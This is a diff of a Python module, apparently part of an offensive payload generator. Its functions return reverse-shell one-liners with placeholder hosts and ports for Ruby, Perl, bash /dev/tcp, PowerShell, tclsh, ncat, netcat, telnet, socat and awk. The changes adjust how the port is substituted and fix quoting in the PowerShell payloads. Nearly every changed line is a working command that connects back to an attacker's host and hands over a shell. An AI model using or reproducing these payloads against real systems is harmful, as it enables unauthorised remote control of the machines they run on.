@@ -16,7 +16,7 @@ def REV_PHP_TCP():
 
 
 def REV_RUBY_TCP():
-    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET','PORT');while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|io|VAR1.print io.read}end" """
+    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|io|VAR1.print io.read}end" """
 
 
 def REV_PERL_TCP():
@@ -24,63 +24,63 @@ def REV_PERL_TCP():
 
 
 def REV_PERL_TCP_2():
-    return r"""perl -MIO::Socket::INET -e "\$VAR1=fork;exit,if(\$VAR1);\$VAR2=new IO::Socket::INET(PeerAddr,'TARGET:PORT');\$VAR2->send('shell>');STDIN->fdopen(\$VAR2,r);$~->fdopen(\$VAR2,w);system\$_ while<>;" """
+    return r"""perl -MIO::Socket::INET -e "\$VAR1=fork;exit,if(\$VAR1);\$VAR2=new IO::Socket::INET(PeerAddr,'TARGET:'.PORT);\$VAR2->send('shell>');STDIN->fdopen(\$VAR2,r);$~->fdopen(\$VAR2,w);system\$_ while<>;" """
 
 
 def REV_PERL_UDP():
-    return """perl -MIO::Socket::INET -e '$|=1;$VAR1 = new IO::Socket::INET(PeerAddr => "TARGET:PORT",Proto => "udp");while(NUM1){$VAR1->send("shell>");$VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""
+    return """perl -MIO::Socket::INET -e '$|=1;$VAR1 = new IO::Socket::INET(PeerAddr => "TARGET:".PORT,Proto => "udp");while(NUM1){$VAR1->send("shell>");$VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""
 
 
 def BASH_TCP():
-    return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
+    return """/bin/bash -i >& /dev/tcp/TARGET/$((PORT)) 0>&1"""
 
 
 def REV_POWERSHELL_TCP():
-    """powershell.exe -nop -ep bypass -Command "$VAR1='TARGET';$VAR2=PORT;$VAR3 = New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5 = 0..65535|%{0};$VAR6 = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ');$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7 = $VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8 = ([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9 = (Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$VAR10 = $VAR9 +  'PS ' + (Get-Location).Path + '> ';$VAR12 = ($VAR11[0]|Out-String);$VAR11.clear();$VAR10 = $VAR10 + $VAR12;$VAR6 = ([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};" """
+    return """powershell.exe -nop -ep bypass -Command '$VAR1=\\"TARGET\\";$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes(\\"PS \\"+(Get-Location).Path+\\"> \\");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning \\"Something went wrong with execution of command on the target.\\";Write-Error $_;};$VAR10=$VAR9+\\"PS \\"+(Get-Location).Path+\\"> \\";$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};'"""
 
 
 def REVERSE_TCLSH():
-    return """echo 'set VAR1 [socket TARGET PORT];while NUM1 {puts -nonewline $VAR1 "shell>";flush $VAR1;gets $VAR1 VAR2;set VAR3 "exec $VAR2";if {![catch {set VAR4 [eval $VAR3]} err]} {puts $VAR1 $VAR4};flush $VAR1;};close $VAR1;'|tclsh"""
+    return """echo 'set VAR1 [socket TARGET [expr PORT]];while NUM1 {puts -nonewline $VAR1 "shell>";flush $VAR1;gets $VAR1 VAR2;set VAR3 "exec $VAR2";if {![catch {set VAR4 [eval $VAR3]} err]} {puts $VAR1 $VAR4};flush $VAR1;};close $VAR1;'|tclsh"""
 
 
 def REVERSE_NCAT():
-    return "ncat TARGET PORT -e /bin/bash"
+    return "ncat TARGET $((PORT)) -e /bin/bash"
 
 
 def REVERSE_NC_TRADITIONAL_1():
-    return "nc TARGET PORT -c /bin/bash"
+    return "nc TARGET $((PORT)) -c /bin/bash"
 
 
 def REVERSE_NC_UDP_1():
-    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
+    return """mkfifo fifo ; nc.traditional -u TARGET $((PORT)) < fifo | { bash -i; } > fifo"""
 
 
 def REVERSE_MKFIFO_NC():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET $((PORT)) > /tmp/VAR1"
 
 
 def REVERSE_MKNOD_NC():
-    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET $((PORT)) 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
 
 
 def REVERSE_MKFIFO_TELNET():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|telnet TARGET $((PORT)) > /tmp/VAR1"
 
 
 def REVERSE_MKNOD_TELNET():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET $((PORT)) 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
 
 
 def REVERSE_SOCAT():
-    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+    return """socat tcp-connect:TARGET:$((PORT)) exec:"bash -li",pty,stderr,setsid,sigint,sane"""
 
 
 def REVERSE_AWK():
-    return """awk 'BEGIN{VAR1="/inet/tcp/0/TARGET/PORT";while(NUM1){do{printf "shell>"|&VAR1;VAR1|& getline VAR2;if(VAR2){while((VAR2|& getline)>0)print $0|&VAR1;close(VAR2);}}while(VAR2!="exit")close(VAR1);break}}' /dev/null"""
+    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
 
 
 def REVERSE_AWK_UDP():
-    return """awk 'BEGIN{VAR1="/inet/udp/0/TARGET/PORT";while(NUM1){do{printf "shell>"|&VAR1;VAR1|& getline VAR2;if(VAR2){while((VAR2|& getline)>0)print $0|&VAR1;close(VAR2);}}while(VAR2!="exit")close(VAR1);break}}' /dev/null"""
+    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/udp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
 
 
 def REVERSE_WINDOWS_BAT2METERPRETER_TCP():
@@ -100,7 +100,7 @@ def REVERSE_WINDOWS_BLOODSEEKER_TCP():
 
 
 def REVERSE_POWERSHELL_TINY_TCP():
-    return """powershell.exe -nop -ep bypass -Command "$VAR1=new-object system.net.sockets.tcpclient('TARGET',PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3 = 0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6 + 'PS' + (pwd).Path + '>';$VAR7 = ([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()" """
+    return """powershell.exe -nop -ep bypass -Command '$VAR1=new-object system.net.sockets.tcpclient(\\"TARGET\\",PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+\\"PS \\"+(pwd).Path+\\">\\";$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()'"""
 
 
 def REVERSE_POWERSHELL_NISHANG_TCP():
